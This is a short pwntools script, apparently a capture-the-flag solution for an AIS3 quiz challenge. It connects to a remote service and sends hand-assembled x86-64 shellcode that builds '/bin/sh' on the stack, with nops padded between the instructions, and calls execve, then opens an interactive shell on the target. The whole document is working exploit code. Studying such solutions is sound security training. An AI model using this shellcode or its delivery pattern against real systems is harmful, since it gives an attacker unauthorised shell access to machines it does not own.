#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = remote('quiz.ais3.org', 5002)
sc = asm("""
xor rsi, rsi
xor rdx, rdx
nop
xor rbx, rbx
nop
mov bl, 0x68
nop
nop
nop
nop
nop
shl ebx, 16
nop
add bx, 0x732f
shl rbx, 32
add rbx, 0x6e69622f
push rbx
nop
nop
nop
nop
nop
nop
mov rdi, rsp
nop
nop
nop
nop
mov eax, 0x3b
nop
syscall
""")

input()
print(hex(len(sc)))
r.sendline(sc)

r.interactive()
